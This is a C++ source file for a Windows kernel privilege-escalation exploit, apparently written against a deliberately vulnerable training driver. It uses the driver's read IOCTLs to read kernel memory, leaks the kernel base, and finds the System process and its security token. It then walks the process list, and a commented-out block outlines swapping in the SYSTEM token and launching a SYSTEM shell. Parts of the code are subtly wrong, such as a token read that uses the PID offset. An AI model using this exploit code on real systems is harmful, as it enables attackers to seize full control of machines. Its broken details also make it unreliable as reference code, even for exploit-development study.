#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <iostream>
#include <sstream>

#define IOCTL_READ_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define EPROCESS structure offsets
#define EPROCESS_PID_OFFSET   0x440     // PID offset in EPROCESS
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET   0x448     // PID offset in EPROCESS
#define EPROCESS_TOKEN_OFFSET 0x4b8     // Token offset in EPROCESS

HANDLE hDevice;

uint64_t addressSystemEprocess;
ULONG_PTR PsInitialSystemProcess; // that global symbol in kernel

HANDLE openDevice(PCWSTR symLink) {
    return CreateFile(
        symLink,   // The symbolic link to the device
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
}

UCHAR readBYTE(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint8_t buffer[9]; // buffer[0-7] = address, buffer[8] = value

    memcpy(buffer, &address, sizeof(PVOID));

    bool success;
    DWORD bytesReturned;
    success = DeviceIoControl(
        hDevice,
        IOCTL_READ_BYTE,
        &buffer,
        sizeof(buffer),
        &buffer,
        sizeof(buffer),
        &bytesReturned,
        NULL);

    if (!success) {
        std::cerr << "Read failed. Error: " << GetLastError() << std::endl;
        return -1;
    }

    return buffer[8];
}

WORD readWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    WORD result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    result |= readBYTE(ptr);
    result |= (readBYTE(ptr + 1) << 8);

    return result;
}

DWORD readDWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    DWORD result = 0;

    // Cast the base address to BYTE* for proper byte-wise pointer arithmetic
    BYTE* ptr = static_cast<BYTE*>(address);

    // Read each byte and shift them into the DWORD result
    result |= readBYTE(ptr);               // Read byte 0
    result |= (readBYTE(ptr + 1) << 8);    // Read byte 1
    result |= (readBYTE(ptr + 2) << 16);   // Read byte 2
    result |= (readBYTE(ptr + 3) << 24);   // Read byte 3

    return result;
}

uint64_t readQWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint64_t result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    DWORD lowPart = readDWORD(ptr);
    DWORD highPart = readDWORD(ptr + 4);

    result = (static_cast<uint64_t>(highPart) << 32) | static_cast<uint64_t>(lowPart);

    return result;
}

// +
ULONG_PTR GetAddressKernelBase() // from userspace
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

// +
DWORD GetOffsetSystemProcess() // from userspace
{
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

// +
ULONG_PTR GetKernelAddressSystem(ULONG_PTR KernelBase, DWORD Offset) // from userspace
{
    return KernelBase + Offset;
}

// +
ULONG_PTR GetToken(ULONG_PTR addressEPROCESS)
{
    if (addressEPROCESS == 0) {
        printf("");
        std::cout << "[-] Pointer to EPROCESS " << std::hex << addressEPROCESS << " is not initialized!" << std::endl;
    }

    PVOID addressToken = reinterpret_cast<PVOID>(addressEPROCESS + EPROCESS_PID_OFFSET);
    ULONG_PTR Token = readQWORD(addressToken);
    return Token;
}

// +
DWORD GetPID(ULONG_PTR addressEPROCESS) {
    if (addressEPROCESS == 0) {
        printf("");
        std::cout << "[-] Pointer to EPROCESS " << std::hex << addressEPROCESS << " is not initialized!" << std::endl;
    }

    PVOID addressPID = reinterpret_cast<PVOID>(addressEPROCESS + EPROCESS_PID_OFFSET);
    DWORD PID = readDWORD(addressPID);

    return PID;
}

ULONG_PTR GetEprocessByPid(DWORD Pid) {
    DWORD currentPID = 0;
    ULONG_PTR currentEprocess = 0;
    ULONG_PTR flink = 0;

    // start traversing from the System process
    currentEprocess = addressSystemEprocess;
    currentPID = GetPID(currentEprocess);

    while (currentPID != Pid) {
        // read the address for the next EPROCESS in the list

        PVOID addressNextEprocess = reinterpret_cast<PVOID>(currentEprocess + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
        uint64_t flink = readQWORD(addressNextEprocess);

        // the address points to the Flink field, so we need to substract the offset of ActiveProcessLinks to get the base address of the EPROCESS structure
        currentEprocess = flink - EPROCESS_ACTIVEPROCESSLINKS_OFFSET;
        currentPID = GetPID(currentEprocess);
    }

    return currentEprocess;
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <kernel_address>" << std::endl;
        return 1;
    }

    scanf_s("%*c");

    // Parse the memory address from argv[1]
    std::stringstream ss;
    ss << std::hex << argv[1];
    PVOID address = nullptr;
    ss >> address;

    if (address == nullptr) {
        std::cerr << "Invalid address provided." << std::endl;
        return 1;
    }

    hDevice = openDevice(L"\\\\.\\VulnerableDriver");
    std::cout << "Read BYTE successful, value: 0x" << std::hex << static_cast<int>(readBYTE(address)) << std::endl;
    std::cout << "Read DWORD successful, value: 0x" << std::hex << static_cast<int>(readDWORD(address)) << std::endl;
    std::cout << "Read QWORD successful, value: 0x" << std::hex << static_cast<uint64_t>(readQWORD(address)) << std::endl;

    ///////////////////////////////////// Get EPROCESS address of system

    ULONG_PTR addressKernelBase = GetAddressKernelBase();
    if (!addressKernelBase) return -1;

    DWORD offsetSystemProcess = GetOffsetSystemProcess();
    if (!offsetSystemProcess) return -1;

    PsInitialSystemProcess = GetKernelAddressSystem(addressKernelBase, offsetSystemProcess);
    addressSystemEprocess = readQWORD(reinterpret_cast<PVOID>(PsInitialSystemProcess));
    std::cout << "EPROCESS address of System is: 0x" << std::hex << addressSystemEprocess << std::endl;

    //////////////////////////////////// Get token of System
    PVOID addressTokenSystem = reinterpret_cast<PVOID>(addressSystemEprocess + EPROCESS_TOKEN_OFFSET);
    ULONG_PTR valueTokenSystem = (ULONG_PTR)readQWORD(addressTokenSystem);
    std::cout << "Token field value is: 0x" << std::hex << valueTokenSystem << std::endl;

    //////////////////////////////////// Get ActiveProcessLinks linked list

    PVOID addressActiveProcessList = reinterpret_cast<PVOID>(addressSystemEprocess + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
    ULONG_PTR ActiveProcessLinks = readQWORD(addressActiveProcessList);
    std::cout << "ActiveProcessLinks field value is: 0x" << std::hex << ActiveProcessLinks << std::endl;

    ULONG_PTR eprocess = GetEprocessByPid(10572);
    std::cout << "cmd eprocess value is: 0x" << std::hex << eprocess << std::endl;

    /*
    HANDLE hDevice = open_driver_handle();
    if (!hDevice) {
        return -1;
    }

    // Get the SYSTEM token via arbitrary read
    PVOID systemToken = get_system_token(hDevice);
    if (!systemToken) {
        CloseHandle(hDevice);
        return -1;
    }

    // Replace current process token with SYSTEM token via arbitrary write
    if (!set_system_token(hDevice, systemToken)) {
        printf("[-] Failed to set SYSTEM token\n");
        CloseHandle(hDevice);
        return -1;
    }

    printf("[+] Successfully set SYSTEM token for current process\n");

    // Spawn a SYSTEM cmd.exe
    printf("[+] Spawning SYSTEM cmd.exe\n");
    system("cmd.exe");
    */

    CloseHandle(hDevice);
    return 0;
}
